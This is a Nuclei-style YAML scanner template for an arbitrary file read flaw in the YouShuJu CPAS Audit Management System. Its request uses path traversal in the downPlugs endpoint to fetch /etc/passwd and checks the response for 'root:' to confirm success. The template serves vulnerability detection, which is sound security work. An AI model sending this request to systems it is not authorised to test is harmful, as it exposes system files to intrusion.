id: poc-yaml-youdatasum-cpas-downplugs-anyfile-read

info:
  name: YouShuJu CPAS Audit Management System downPlugs Arbitrary File Read
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read
  description: |
    Arbitrary file read vulnerability in YouShuJu CPAS Audit Management System. Allows attackers to read sensitive files on the target system.

http:
  - method: GET
    path:
      - "{{BaseURL}}/cpasm4/plugInManController/downPlugs?fileId=../../../../etc/passwd&fileName="
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "root:"
          - "/bin"
      - type: word
        part: header
        words:
          - "fileName="
      - type: word
        part: header
        words:
          - "multipart/form-data"
      - type: word
        part: body
        words:
          - "<"
        negative: true
